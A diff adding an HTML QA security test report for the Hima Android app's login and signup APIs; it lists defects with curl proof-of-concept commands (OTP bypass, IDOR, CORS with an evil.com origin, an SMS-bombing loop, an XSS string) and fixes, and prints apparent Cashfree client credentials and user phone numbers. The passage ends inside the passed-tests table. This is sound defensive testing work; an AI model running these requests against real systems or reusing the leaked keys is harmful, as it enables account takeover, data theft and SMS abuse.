@@ -1,0 +1,509 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Login & Signup API Test Report — Hima</title>
+<style>
+  @page {
+    size: A4;
+    margin: 18mm 16mm 20mm 16mm;
+    @bottom-center { content: "Page " counter(page) " of " counter(pages); }
+  }
+  *{box-sizing:border-box}
+  html,body{margin:0;padding:0;background:#fff;color:#1f2937;font:11pt/1.5 -apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif}
+  h1,h2,h3,h4{color:#0f172a;font-weight:700;margin:0}
+  h1{font-size:24pt;letter-spacing:-.3pt}
+  h2{font-size:15pt;margin:0 0 10pt;padding-bottom:6pt;border-bottom:2pt solid #1e40af;color:#1e40af}
+  h3{font-size:12pt;margin:14pt 0 6pt}
+  p{margin:6pt 0}
+  a{color:#1e40af;text-decoration:none}
+  code{font:10pt ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;background:#f1f5f9;padding:1pt 4pt;border-radius:3pt;color:#0f172a}
+  pre{background:#0f172a;color:#e2e8f0;border-radius:4pt;padding:10pt 12pt;font:9.5pt/1.45 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;overflow:hidden;white-space:pre-wrap;word-break:break-all;margin:6pt 0}
+  pre code{background:none;color:inherit;padding:0}
+
+  /* ============== COVER ============== */
+  .cover{page-break-after:always;padding-top:40pt;text-align:left}
+  .cover .brand{font-size:10pt;letter-spacing:3pt;color:#64748b;text-transform:uppercase;margin-bottom:14pt}
+  .cover h1{font-size:32pt;line-height:1.15;margin-bottom:6pt}
+  .cover .subtitle{color:#475569;font-size:14pt;margin-bottom:40pt}
+  .cover .banner{background:linear-gradient(135deg,#1e40af,#3b82f6);color:#fff;padding:26pt 28pt;border-radius:6pt;margin-bottom:24pt}
+  .cover .banner .label{font-size:9pt;letter-spacing:2pt;text-transform:uppercase;opacity:.85}
+  .cover .banner .verdict{font-size:22pt;font-weight:700;margin-top:4pt}
+  .cover .banner .tagline{margin-top:6pt;font-size:11pt;opacity:.95}
+  .cover .meta-grid{display:grid;grid-template-columns:1fr 1fr;gap:10pt;margin-bottom:20pt}
+  .cover .meta-grid .cell{border:1pt solid #e2e8f0;border-radius:5pt;padding:12pt 14pt;background:#f8fafc}
+  .cover .meta-grid .cell .k{font-size:8pt;letter-spacing:1.5pt;color:#64748b;text-transform:uppercase}
+  .cover .meta-grid .cell .v{font-size:12pt;font-weight:600;color:#0f172a;margin-top:3pt}
+  .cover .submitted{border-top:1pt solid #e2e8f0;padding-top:14pt;margin-top:30pt;color:#475569;font-size:10pt}
+  .cover .submitted b{color:#0f172a}
+
+  /* ============== SEVERITY COUNTS ============== */
+  .counts{display:grid;grid-template-columns:repeat(5,1fr);gap:8pt;margin:10pt 0 18pt}
+  .count-card{border:1pt solid #e2e8f0;border-top-width:3pt;border-radius:5pt;padding:10pt;text-align:center;background:#fff}
+  .count-card.s1{border-top-color:#dc2626}
+  .count-card.s2{border-top-color:#ea580c}
+  .count-card.s3{border-top-color:#ca8a04}
+  .count-card.s4{border-top-color:#0284c7}
+  .count-card.ok{border-top-color:#059669}
+  .count-card .n{font-size:22pt;font-weight:700;color:#0f172a;line-height:1}
+  .count-card.s1 .n{color:#dc2626}
+  .count-card.s2 .n{color:#ea580c}
+  .count-card.s3 .n{color:#ca8a04}
+  .count-card.s4 .n{color:#0284c7}
+  .count-card.ok .n{color:#059669}
+  .count-card .l{font-size:8.5pt;color:#64748b;margin-top:4pt;letter-spacing:.5pt;text-transform:uppercase}
+
+  /* ============== BADGES ============== */
+  .badge{display:inline-block;font-size:8pt;font-weight:700;padding:2pt 7pt;border-radius:9pt;letter-spacing:.6pt;text-transform:uppercase;vertical-align:middle}
+  .badge.s1{background:#fee2e2;color:#991b1b;border:.5pt solid #fca5a5}
+  .badge.s2{background:#ffedd5;color:#9a3412;border:.5pt solid #fdba74}
+  .badge.s3{background:#fef9c3;color:#854d0e;border:.5pt solid #fde047}
+  .badge.s4{background:#e0f2fe;color:#075985;border:.5pt solid #7dd3fc}
+  .fixloc{display:inline-block;font-size:8pt;font-weight:700;padding:2pt 7pt;border-radius:3pt;letter-spacing:.5pt;text-transform:uppercase;vertical-align:middle}
+  .fixloc.client{background:#dcfce7;color:#166534;border:.5pt solid #86efac}
+  .fixloc.both{background:#fef3c7;color:#854d0e;border:.5pt solid #fcd34d}
+  .fixloc.server{background:#fee2e2;color:#991b1b;border:.5pt solid #fca5a5}
+
+  /* ============== TABLES ============== */
+  table{width:100%;border-collapse:collapse;margin:8pt 0;font-size:10pt}
+  th,td{text-align:left;padding:6pt 9pt;border:.5pt solid #e2e8f0;vertical-align:top}
+  th{background:#f1f5f9;color:#0f172a;font-weight:700;font-size:9.5pt;letter-spacing:.3pt}
+  tr:nth-child(even) td{background:#fafbfc}
+
+  /* ============== BUG CARDS ============== */
+  .bug{border:1pt solid #e2e8f0;border-left:4pt solid #cbd5e1;border-radius:5pt;padding:12pt 14pt;margin:10pt 0;background:#fff;page-break-inside:avoid}
+  .bug.s1{border-left-color:#dc2626}
+  .bug.s2{border-left-color:#ea580c}
+  .bug.s3{border-left-color:#ca8a04}
+  .bug.s4{border-left-color:#0284c7}
+  .bug .head{display:flex;align-items:center;gap:8pt;margin-bottom:6pt;flex-wrap:wrap}
+  .bug .id{font:9pt ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;background:#0f172a;color:#e2e8f0;padding:2pt 7pt;border-radius:3pt;font-weight:700}
+  .bug .title{font-size:11.5pt;font-weight:700;color:#0f172a;flex:1}
+  .bug .row{display:grid;grid-template-columns:80pt 1fr;gap:6pt;margin:3pt 0;font-size:10pt}
+  .bug .row .k{color:#64748b;font-weight:600;font-size:9pt;text-transform:uppercase;letter-spacing:.4pt;padding-top:1pt}
+  .bug .proof-label{font-size:8.5pt;color:#64748b;margin:6pt 0 2pt;letter-spacing:.6pt;text-transform:uppercase;font-weight:700}
+  .bug .fix-android{background:#ecfdf5;border:.5pt solid #a7f3d0;border-radius:4pt;padding:8pt 10pt;margin-top:6pt;font-size:10pt}
+  .bug .fix-android b{color:#047857}
+  .bug .fix-server{background:#fef2f2;border:.5pt solid #fecaca;border-radius:4pt;padding:8pt 10pt;margin-top:4pt;font-size:10pt}
+  .bug .fix-server b{color:#b91c1c}
+
+  /* ============== CALL-OUTS ============== */
+  .callout{border-radius:5pt;padding:12pt 14pt;margin:10pt 0;font-size:10.5pt}
+  .callout.red{background:#fef2f2;border:1pt solid #fca5a5;color:#7f1d1d}
+  .callout.amber{background:#fffbeb;border:1pt solid #fcd34d;color:#78350f}
+  .callout.blue{background:#eff6ff;border:1pt solid #93c5fd;color:#1e3a8a}
+  .callout.green{background:#ecfdf5;border:1pt solid #6ee7b7;color:#065f46}
+  .callout b{color:inherit}
+
+  /* ============== FIX SPLIT CARDS ============== */
+  .fix-cards{display:grid;grid-template-columns:repeat(3,1fr);gap:10pt;margin:10pt 0}
+  .fix-card{border:1pt solid #e2e8f0;border-top-width:3pt;border-radius:5pt;padding:12pt;background:#fff}
+  .fix-card.client{border-top-color:#059669}
+  .fix-card.both{border-top-color:#ca8a04}
+  .fix-card.server{border-top-color:#dc2626}
+  .fix-card .hdr{font-size:10pt;font-weight:700;margin-bottom:4pt}
+  .fix-card.client .hdr{color:#047857}
+  .fix-card.both .hdr{color:#854d0e}
+  .fix-card.server .hdr{color:#b91c1c}
+  .fix-card .big{font-size:30pt;font-weight:700;color:#0f172a;line-height:1;margin:2pt 0 6pt}
+  .fix-card ul{margin:4pt 0 0 14pt;padding:0;font-size:9.5pt;color:#334155}
+  .fix-card li{margin:2pt 0}
+
+  .page-break{page-break-before:always}
+  .no-break{page-break-inside:avoid}
+
+  ul.clean{margin:4pt 0 4pt 16pt;padding:0}
+  ul.clean li{margin:3pt 0}
+
+  .footer-note{color:#64748b;font-size:9pt;margin-top:14pt;border-top:.5pt solid #e2e8f0;padding-top:8pt}
+</style>
+</head>
+<body>
+
+<!-- ================= COVER ================= -->
+<div class="cover">
+  <div class="brand">QA · API Test Report</div>
+  <h1>Login &amp; Signup Flow<br>API Security &amp; Functional Test Report</h1>
+  <div class="subtitle">Hima Android App · Auth &amp; Onboarding Endpoints</div>
+
+  <div class="banner">
+    <div class="label">Overall Verdict</div>
+    <div class="verdict">FAIL — Release Blocker</div>
+    <div class="tagline">4 Critical (S1) defects found in the login flow. Not safe to ship to production until backend fixes are applied.</div>
+  </div>
+
+  <div class="meta-grid">
+    <div class="cell"><div class="k">Tester</div><div class="v">Perumal (QA)</div></div>
+    <div class="cell"><div class="k">Date of Testing</div><div class="v">21 April 2026</div></div>
+    <div class="cell"><div class="k">Environment</div><div class="v">Dev — demohima.himaapp.in</div></div>
+    <div class="cell"><div class="k">Branch</div><div class="v">login_flow_test_21_04_2026</div></div>
+    <div class="cell"><div class="k">Scope</div><div class="v">Login / Signup / OTP / Profile APIs</div></div>
+    <div class="cell"><div class="k">Total Test Cases</div><div class="v">52 executed</div></div>
+    <div class="cell"><div class="k">Tools Used</div><div class="v">curl, Retrofit code review</div></div>
+    <div class="cell"><div class="k">Access Level</div><div class="v">Android codebase only (no backend access)</div></div>
+  </div>
+
+  <div class="submitted">
+    <b>Submitted to:</b> Tech Lead &nbsp;·&nbsp; <b>Submitted by:</b> Perumal, QA — perumal@innovfix.in<br>
+    <b>Purpose:</b> To document API-level defects found in the login flow, flag release blockers, and clarify which items can be fixed from the Android side versus the backend.
+  </div>
+</div>
+
+<!-- ================= EXECUTIVE SUMMARY ================= -->
+<h2>1. Executive Summary</h2>
+<p>I performed black-box API testing on the entire login and signup flow of the Hima Android app using <code>curl</code> against the dev environment, supplemented by source-code review of the Retrofit client, view-models and activities. A total of <b>52 test cases</b> were executed covering positive paths, negative inputs, validation, authentication, IDOR, CORS, rate-limiting and payload edge cases.</p>
+<p>The flow is <b>functionally working</b> (happy path passes) but the design has serious security defects. The most important finding is that <b>OTP verification happens only on the client side</b> — the server&rsquo;s <code>/login</code> endpoint issues a valid JWT without validating the OTP at all. Combined with an IDOR issue on <code>/userdetails</code>, any attacker with only a phone number can log into any account and read every other user&rsquo;s profile data.</p>
+
+<h3>Severity Distribution</h3>
+<div class="counts">
+  <div class="count-card s1"><div class="n">4</div><div class="l">S1 Critical</div></div>
+  <div class="count-card s2"><div class="n">4</div><div class="l">S2 High</div></div>
+  <div class="count-card s3"><div class="n">5</div><div class="l">S3 Medium</div></div>
+  <div class="count-card s4"><div class="n">3</div><div class="l">S4 Low</div></div>
+  <div class="count-card ok"><div class="n">8</div><div class="l">Passed</div></div>
+</div>
+
+<div class="callout red">
+  <b>Release decision:</b> Do not ship to production until the 4 S1 defects are fixed on the backend. The login flow is currently equivalent to unauthenticated login by phone number.
+</div>
+
+<!-- ================= WHO CAN FIX WHAT ================= -->
+<h2>2. Fix Responsibility — Android vs Backend</h2>
+<p>Since I only have access to the <b>Android codebase</b> (no backend access), I analysed each bug for where the fix must live. Of the 16 bugs found, <b>only one (BUG-015) can be fully closed from the Android side</b>. The rest either require backend changes or depend on external actions (e.g. rotating vendor keys).</p>
+
+<div class="fix-cards">
+  <div class="fix-card client">
+    <div class="hdr">Fully closeable on Android</div>
+    <div class="big">1</div>
+    <ul><li>BUG-015 — <code>Log.d</code> stripping (already fixed and verified)</li></ul>
+  </div>
+  <div class="fix-card both">
+    <div class="hdr">Partially mitigable on Android</div>
+    <div class="big">5</div>
+    <ul>
+      <li>BUG-001, BUG-006, BUG-013, BUG-014, BUG-016</li>
+      <li>Needs additional backend / external action to fully close</li>
+    </ul>
+  </div>
+  <div class="fix-card server">
+    <div class="hdr">Server-only — needs backend team</div>
+    <div class="big">10</div>
+    <ul>
+      <li>BUG-002, 003, 004, 005, 007, 008, 009, 010, 011, 012</li>
+      <li>No Android-side workaround exists</li>
+    </ul>
+  </div>
+</div>
+
+<div class="callout amber">
+  <b>Why this matters:</b> An attacker bypasses the Android app entirely and calls the API directly with <code>curl</code>. Any defence implemented only on the Android side is cosmetic. All 4 S1 release-blockers are in the server-only or partial-mitigable bucket. <b>Please escalate BUG-001 through BUG-004 to the backend team.</b>
+</div>
+
+<div class="page-break"></div>
+
+<!-- ================= ENDPOINT COVERAGE ================= -->
+<h2>3. Endpoint Coverage Summary</h2>
+<table>
+  <thead><tr><th>#</th><th>Endpoint</th><th>Method</th><th>Auth</th><th>Status</th><th>Defects</th></tr></thead>
+  <tbody>
+    <tr><td>1</td><td><code>/first_install</code></td><td>POST</td><td>None</td><td>Works</td><td>BUG-011</td></tr>
+    <tr><td>2</td><td><code>/appsettings_list</code></td><td>POST</td><td>None</td><td>Works</td><td>—</td></tr>
+    <tr><td>3</td><td><code>/send_otp</code></td><td>POST</td><td>None</td><td>Multiple defects</td><td>001, 004, 005, 006, 009</td></tr>
+    <tr><td>4</td><td><code>/login</code></td><td>POST</td><td>None</td><td>Critical</td><td>001, 004, 008</td></tr>
+    <tr><td>5</td><td><code>/register</code></td><td>POST</td><td>None</td><td>High</td><td>007, 010, 012, 013</td></tr>
+    <tr><td>6</td><td><code>/avatar_list</code></td><td>POST</td><td>Bearer</td><td>Works</td><td>—</td></tr>
+    <tr><td>7</td><td><code>/userdetails</code></td><td>POST</td><td>Bearer</td><td>Critical</td><td>002</td></tr>
+    <tr><td>8</td><td><code>/delete_users</code></td><td>POST</td><td>Bearer</td><td>Works</td><td>016</td></tr>
+  </tbody>
+</table>
+
+<!-- ================= DEFECT SUMMARY TABLE ================= -->
+<h2>4. Defect Summary</h2>
+<table>
+  <thead><tr><th>ID</th><th>Severity</th><th>Summary</th><th>Fix Location</th></tr></thead>
+  <tbody>
+    <tr><td>BUG-001</td><td><span class="badge s1">S1</span></td><td>OTP verified only on Android client; <code>/login</code> accepts any code</td><td><span class="fixloc both">Both</span></td></tr>
+    <tr><td>BUG-002</td><td><span class="badge s1">S1</span></td><td>IDOR on <code>/userdetails</code> — any user can read every other profile</td><td><span class="fixloc server">Server</span></td></tr>
+    <tr><td>BUG-003</td><td><span class="badge s1">S1</span></td><td>CORS reflects any Origin with <code>Allow-Credentials: true</code></td><td><span class="fixloc server">Server</span></td></tr>
+    <tr><td>BUG-004</td><td><span class="badge s1">S1</span></td><td>No rate limiting — SMS-bomb vector</td><td><span class="fixloc server">Server</span></td></tr>
+    <tr><td>BUG-005</td><td><span class="badge s2">S2</span></td><td><code>/send_otp</code> returns HTTP 500 HTML for invalid input</td><td><span class="fixloc server">Server</span></td></tr>
+    <tr><td>BUG-006</td><td><span class="badge s2">S2</span></td><td>Client chooses the OTP value sent to <code>/send_otp</code></td><td><span class="fixloc both">Both</span></td></tr>
+    <tr><td>BUG-007</td><td><span class="badge s2">S2</span></td><td><code>/register</code> requires no proof of mobile ownership</td><td><span class="fixloc server">Server</span></td></tr>
+    <tr><td>BUG-008</td><td><span class="badge s2">S2</span></td><td>JWT valid for 90 days with no revocation mechanism</td><td><span class="fixloc server">Server</span></td></tr>
+    <tr><td>BUG-009</td><td><span class="badge s3">S3</span></td><td><code>country_code=xyz</code> accepted by <code>/send_otp</code></td><td><span class="fixloc server">Server</span></td></tr>
+    <tr><td>BUG-010</td><td><span class="badge s3">S3</span></td><td>HTTP 200 returned for business-logic failures</td><td><span class="fixloc server">Server</span></td></tr>
+    <tr><td>BUG-011</td><td><span class="badge s3">S3</span></td><td><code>/first_install</code> leaks caller IP address</td><td><span class="fixloc server">Server</span></td></tr>
+    <tr><td>BUG-012</td><td><span class="badge s3">S3</span></td><td>Referral code not validated on <code>/register</code></td><td><span class="fixloc server">Server</span></td></tr>
+    <tr><td>BUG-013</td><td><span class="badge s3">S3</span></td><td>No payload size cap on <code>/register</code></td><td><span class="fixloc both">Both</span></td></tr>
+    <tr><td>BUG-014</td><td><span class="badge s4">S4</span></td><td>Cashfree test credentials hard-coded in source</td><td><span class="fixloc both">Both</span></td></tr>
+    <tr><td>BUG-015</td><td><span class="badge s4">S4</span></td><td>OTP and request bodies logged via <code>Log.d</code></td><td><span class="fixloc client">Android ✓ Fixed</span></td></tr>
+    <tr><td>BUG-016</td><td><span class="badge s4">S4</span></td><td>Cryptic error message from <code>/delete_users</code></td><td><span class="fixloc both">Both</span></td></tr>
+  </tbody>
+</table>
+
+<div class="page-break"></div>
+
+<!-- ================= S1 DETAILED ================= -->
+<h2>5. Critical Defects (S1) — Detailed</h2>
+
+<div class="bug s1">
+  <div class="head"><span class="id">BUG-001</span><span class="badge s1">S1 Critical</span><span class="fixloc both">Fix: Android + Server</span></div>
+  <div class="title">OTP verified only on the Android client — <code>/login</code> accepts any code</div>
+  <div class="row"><div class="k">Location</div><div>VerifyOTPActivity.kt:138–156 &nbsp;·&nbsp; ApiManager.kt:1753–1759</div></div>
+  <div class="row"><div class="k">Impact</div><div>Complete account takeover of any user given only their phone number.</div></div>
+  <div class="row"><div class="k">What</div><div>The Android app compares the OTP locally, then calls <code>/login</code> with hard-coded <code>code="0", code_verifier="0"</code>. The server never re-validates the OTP. A backdoor OTP <code>"011011"</code> is also hard-coded in the client.</div></div>
+  <div class="proof-label">Proof of exploit (no SMS was sent before this call)</div>
+<pre><code>$ curl -X POST https://demohima.himaapp.in/api/auth/login \
+       -d "mobile=9876543210&amp;code=0&amp;code_verifier=0"
+
+HTTP/1.1 200 OK
+{ "success":true, "registered":true,
+  "token":"eyJ0eXAiOiJKV1Qi...&lt;valid JWT&gt;",
+  "data":{ "id":456976, "mobile":"9876543210", ... } }</code></pre>
+  <div class="fix-android"><b>Android side:</b> Remove the <code>"011011"</code> backdoor branch and stop generating the OTP locally. Closes the patched-APK abuse path only.</div>
+  <div class="fix-server"><b>Server side (required to truly fix):</b> Generate the OTP server-side (stored hashed, ≤5 min TTL, attempt-counter). Validate it in <code>/login</code>.</div>
+</div>
+
+<div class="bug s1">
+  <div class="head"><span class="id">BUG-002</span><span class="badge s1">S1 Critical</span><span class="fixloc server">Fix: Server only</span></div>
+  <div class="title">IDOR on <code>/userdetails</code> — any logged-in user can read every other user&rsquo;s profile</div>
+  <div class="row"><div class="k">Location</div><div>ApiManager.kt:1817–1821</div></div>
+  <div class="row"><div class="k">Impact</div><div>Mass PII leak. Any attacker can enumerate sequential <code>user_id</code> values and dump every user&rsquo;s mobile number, name, gender and referral code. Regulated data under the India DPDP Act.</div></div>
+  <div class="row"><div class="k">What</div><div>The server reads <code>user_id</code> from the request body instead of the JWT <code>sub</code> claim. Swapping <code>user_id</code> returns any user&rsquo;s full record.</div></div>
+  <div class="proof-label">Proof of exploit</div>
+<pre><code>$ curl -X POST .../userdetails \
+       -H "Authorization: Bearer &lt;my-token, sub=456976&gt;" \
+       -d "user_id=456975"
+
+{ "data":{ "id":456975, "name":"NisdB403",
+           "mobile":"8464643464",          // not my account
+           "refer_code":"GZDB1289", ... } }</code></pre>
+  <div class="fix-server"><b>Server side:</b> Resolve user id from the JWT <code>sub</code> claim. Do not trust <code>user_id</code> from the body. Audit every other endpoint using the same pattern.</div>
+</div>
+
+<div class="bug s1">
+  <div class="head"><span class="id">BUG-003</span><span class="badge s1">S1 Critical</span><span class="fixloc server">Fix: Server only</span></div>
+  <div class="title">CORS reflects any Origin with <code>Allow-Credentials: true</code></div>
+  <div class="row"><div class="k">Impact</div><div>Any website the victim visits can call the API in their browser session and exfiltrate JWTs when combined with BUG-001.</div></div>
+  <div class="proof-label">Proof of exploit</div>
+<pre><code>$ curl -i -X OPTIONS .../login -H "Origin: https://evil.com"
+
+HTTP/1.1 204 No Content
+Access-Control-Allow-Origin: https://evil.com        ← reflected
+Access-Control-Allow-Credentials: true</code></pre>
+  <div class="fix-server"><b>Server side:</b> Whitelist allowed origins in Laravel CORS config. Do not reflect the request Origin. Drop <code>Allow-Credentials</code> unless strictly required.</div>
+</div>
+
+<div class="bug s1">
+  <div class="head"><span class="id">BUG-004</span><span class="badge s1">S1 Critical</span><span class="fixloc server">Fix: Server only</span></div>
+  <div class="title">No rate limiting on <code>/send_otp</code> or <code>/login</code></div>
+  <div class="row"><div class="k">Impact</div><div>SMS-bombing any Indian mobile number, direct cost impact, brute-force window for OTP once moved server-side.</div></div>
+  <div class="proof-label">Proof — 20 consecutive sends in under two seconds</div>
+<pre><code>$ for i in {1..20}; do
+    curl -s -o /dev/null -w "%{http_code} " \
+         -X POST .../send_otp -d "mobile=9876543210&amp;country_code=91&amp;otp=123456"
+  done
+200 200 200 200 200 200 200 200 200 200
+200 200 200 200 200 200 200 200 200 200     ← all accepted</code></pre>
+  <div class="fix-server"><b>Server side:</b> Add Laravel <code>throttle</code> middleware. Per-mobile + per-IP limit (e.g. 1/30s, 5/hr, 10/day). Attempt cap on <code>/login</code> with cooldown.</div>
+</div>
+
+<div class="page-break"></div>
+
+<!-- ================= S2 DETAILED ================= -->
+<h2>6. High Defects (S2) — Detailed</h2>
+
+<div class="bug s2">
+  <div class="head"><span class="id">BUG-005</span><span class="badge s2">S2 High</span><span class="fixloc server">Fix: Server only</span></div>
+  <div class="title"><code>/send_otp</code> returns HTTP 500 HTML for any invalid input</div>
+  <div class="row"><div class="k">Impact</div><div>Client cannot parse the response. Framework identity (Laravel) is leaked. Indicates a missing <code>FormRequest</code> validator on the controller.</div></div>
+<pre><code>$ curl -i -X POST .../send_otp                              # no body
+HTTP/1.1 500 Internal Server Error
+Content-Type: text/html
+&lt;!DOCTYPE html&gt;&lt;title&gt;Server Error&lt;/title&gt;...</code></pre>
+  <div class="fix-server"><b>Server side:</b> Add Laravel <code>FormRequest</code> validator returning JSON 400 — mirror what <code>/login</code> already does.</div>
+</div>
+
+<div class="bug s2">
+  <div class="head"><span class="id">BUG-006</span><span class="badge s2">S2 High</span><span class="fixloc both">Fix: Android + Server</span></div>
+  <div class="title"><code>/send_otp</code> accepts the OTP value from the client</div>
+  <div class="row"><div class="k">Impact</div><div>The client knows the OTP before the user proves SIM possession. XSS-like payloads are even echoed into the SMS body.</div></div>
+<pre><code>$ curl .../send_otp -d "mobile=9876543210&amp;country_code=91&amp;otp=-1"
+{"success":true,"message":"OTP sent successfully."}
+
+$ curl .../send_otp -d "...&amp;otp=&lt;script&gt;alert(1)&lt;/script&gt;"
+{"success":true,"message":"OTP sent successfully."}</code></pre>
+  <div class="fix-android"><b>Android side:</b> Stop generating the OTP locally. Remove the <code>otp</code> field from the Retrofit call.</div>
+  <div class="fix-server"><b>Server side:</b> Stop accepting the <code>otp</code> field. Generate a cryptographically random 6-digit OTP server-side.</div>
+</div>
+
+<div class="bug s2">
+  <div class="head"><span class="id">BUG-007</span><span class="badge s2">S2 High</span><span class="fixloc server">Fix: Server only</span></div>
+  <div class="title"><code>/register</code> requires no proof of mobile ownership</div>
+  <div class="row"><div class="k">Impact</div><div>Mass spam-signup vector. No link between <code>/send_otp</code> and <code>/register</code>.</div></div>
+<pre><code>$ curl -X POST .../register \
+       -d "mobile=9000000003&amp;language=Tamil&amp;avatar_id=21&amp;gender=male"
+{ "success":true, "message":"Registered successfully.", "token":"...", ... }</code></pre>
+  <div class="fix-server"><b>Server side:</b> Require a single-use, server-issued OTP token (≤5 min TTL) proving the mobile was just verified.</div>
+</div>
+
+<div class="bug s2">
+  <div class="head"><span class="id">BUG-008</span><span class="badge s2">S2 High</span><span class="fixloc server">Fix: Server only</span></div>
+  <div class="title">JWT valid for 90 days with no revocation path</div>
+  <div class="row"><div class="k">Impact</div><div>No logout endpoint, no refresh-rotation. A stolen token works on any device for 90 days. Client logout only clears local prefs.</div></div>
+<pre><code>Decoded JWT payload:
+{ "iat": 1776761750, "exp": 1784537750,   // exp-iat = 7,776,000 s = 90 days
+  "sub": "456976" }</code></pre>
+  <div class="fix-server"><b>Server side:</b> Short-lived access token (≤1 h) + refresh token with server-side rotation and a revocation list. Add a real <code>/logout</code> that blacklists the <code>jti</code>.</div>
+</div>
+
+<div class="page-break"></div>
+
+<!-- ================= S3 DETAILED ================= -->
+<h2>7. Medium Defects (S3) — Detailed</h2>
+
+<div class="bug s3">
+  <div class="head"><span class="id">BUG-009</span><span class="badge s3">S3 Medium</span><span class="fixloc server">Fix: Server only</span></div>
+  <div class="title"><code>country_code=xyz</code> accepted on <code>/send_otp</code></div>
+<pre><code>$ curl .../send_otp -d "mobile=9876543210&amp;country_code=xyz&amp;otp=123456"
+{"success":true,"message":"OTP sent successfully."}</code></pre>
+  <div class="fix-server"><b>Server side:</b> Strict integer validation + allow-list of supported country codes.</div>
+</div>
+
+<div class="bug s3">
+  <div class="head"><span class="id">BUG-010</span><span class="badge s3">S3 Medium</span><span class="fixloc server">Fix: Server only</span></div>
+  <div class="title">HTTP 200 returned for business-logic failures</div>
+  <p style="margin:4pt 0 0"><code>/register</code>, <code>/send_otp</code>, <code>/avatar_list</code> return HTTP 200 with <code>{"success":false,...}</code>. Inconsistent with <code>/login</code> which correctly returns 400. Breaks client retry semantics and monitoring alerts.</p>
+  <div class="fix-server"><b>Server side:</b> Use 4xx for validation / business-logic failures, 5xx for unhandled errors. Never HTML.</div>
+</div>
+
+<div class="bug s3">
+  <div class="head"><span class="id">BUG-011</span><span class="badge s3">S3 Medium</span><span class="fixloc server">Fix: Server only</span></div>
+  <div class="title"><code>/first_install</code> leaks caller IP address</div>
+<pre><code>{ "success":false,
+  "message":"No matching click found within 24 hours...",
+  "ip_address":"103.163.232.121" }    ← unnecessary</code></pre>
+  <div class="fix-server"><b>Server side:</b> Remove <code>ip_address</code> from the response; keep server-side logging only.</div>
+</div>
+
+<div class="bug s3">
+  <div class="head"><span class="id">BUG-012</span><span class="badge s3">S3 Medium</span><span class="fixloc server">Fix: Server only</span></div>
+  <div class="title">Referral code not validated on <code>/register</code></div>
+  <p style="margin:4pt 0 0"><code>referred_by=INVALIDXYZ</code> → account created successfully, referral silently dropped. Creates gaps in referral attribution reporting.</p>
+  <div class="fix-server"><b>Server side:</b> Reject unknown codes OR attribute and return the partner id. Either way, communicate to the client.</div>
+</div>
+
+<div class="bug s3">
+  <div class="head"><span class="id">BUG-013</span><span class="badge s3">S3 Medium</span><span class="fixloc both">Fix: Android + Server</span></div>
+  <div class="title">No payload size cap on <code>/register</code></div>
+  <p style="margin:4pt 0 0">10 KB <code>describe_yourself</code> accepted. Combined with BUG-004 this becomes a DoS / DB bloat vector.</p>
+  <div class="fix-android"><b>Android side:</b> Add <code>InputFilter.LengthFilter</code> and <code>android:maxLength</code> on every signup text field (name ≤ 50, describe_yourself ≤ 500, etc.).</div>
+  <div class="fix-server"><b>Server side:</b> Add <code>max</code> validator rules — attacker bypasses client via curl.</div>
+</div>
+
+<!-- ================= S4 DETAILED ================= -->
+<h2>8. Low Defects (S4) — Detailed</h2>
+
+<div class="bug s4">
+  <div class="head"><span class="id">BUG-014</span><span class="badge s4">S4 Low</span><span class="fixloc both">Fix: Android + external action</span></div>
+  <div class="title">Cashfree test credentials hard-coded in source</div>
+  <div class="row"><div class="k">Location</div><div>CashfreeApiService.kt</div></div>
+<pre><code>x-client-id:     CF10666599D157Q7U76C7C73BOAF4G
+x-client-secret: cfsk_ma_test_40c029f442f352110cb1c3f85aebf06e_085bf549</code></pre>
+  <div class="fix-android"><b>Android side:</b> Move the strings into <code>BuildConfig</code> fed by <code>gradle.properties</code> (not committed).</div>
+  <div class="fix-server"><b>External action (required to truly close):</b> Rotate the keys in the Cashfree dashboard. Without rotation, the already-leaked keys remain valid. Also purge from git history.</div>
+</div>
+
+<div class="bug s4">
+  <div class="head"><span class="id">BUG-015</span><span class="badge s4">S4 Low</span><span class="fixloc client">Fix: Android only — DONE ✓</span></div>
+  <div class="title">OTP and request bodies logged via <code>Log.d</code></div>
+  <div class="row"><div class="k">Status</div><div><b style="color:#047857">Fixed by Android team on 2026-04-21. Verified by QA.</b></div></div>
+  <p style="margin:4pt 0 0">Fix applied: sensitive values removed from log strings in VerifyOTPActivity, NewLoginActivity, LoginViewModel. <code>HttpLoggingInterceptor</code> gated behind <code>BuildConfig.DEBUG</code>. ProGuard <code>-assumenosideeffects</code> rule added for <code>Log.v/d/i</code>.</p>
+  <div class="callout amber" style="margin:8pt 0 0">
+    <b>One follow-up:</b> The ProGuard strip rule only takes effect if <code>isMinifyEnabled = true</code> in the release build — currently set to <code>false</code> in <code>app/build.gradle.kts:38</code>. Recommend enabling minification on release so the rule actually strips residual <code>Log.d</code> calls. Sensitive values are already scrubbed from log strings, so this is a hardening step, not a blocker.
+  </div>
+</div>
+
+<div class="bug s4">
+  <div class="head"><span class="id">BUG-016</span><span class="badge s4">S4 Low</span><span class="fixloc both">Fix: Android + Server</span></div>
+  <div class="title">Cryptic error message from <code>/delete_users</code></div>
+  <p style="margin:4pt 0 0">Server returns <code>"please mail your mobile number and describe your issue"</code> on refused delete. Works correctly (doesn&rsquo;t delete) but the message is user-hostile.</p>
+  <div class="fix-android"><b>Android side:</b> Map the server string to a friendly toast / dialog.</div>
+  <div class="fix-server"><b>Server side:</b> Return HTTP 403 with <code>"You can only delete your own account."</code>.</div>
+</div>
+
+<div class="page-break"></div>
+
+<!-- ================= PASSED CASES ================= -->
+<h2>9. Test Cases That Passed</h2>
+<table>
+  <thead><tr><th style="width:60pt">TC</th><th>Description</th></tr></thead>
+  <tbody>
+    <tr><td>TC-02</td><td><code>appsettings_list</code> returns version and socket URL</td></tr>
+    <tr><td>TC-11</td><td><code>send_otp</code> happy path returns 200 <i>OTP sent successfully</i></td></tr>
+    <tr><td>TC-23</td><td><code>/login</code> returns JWT and user data for valid mobile (functional pass — security issue is BUG-001)</td></tr>
+    <tr><td>TC-29</td><td><code>/userdetails</code> with valid token returns own profile</td></tr>
+    <tr><td>TC-38</td><td><code>/avatar_list gender=male</code> returns 9 avatars</td></tr>
+    <tr><td>TC-39 / TC-40</td><td><code>/avatar_list</code> correctly rejects invalid and missing gender</td></tr>
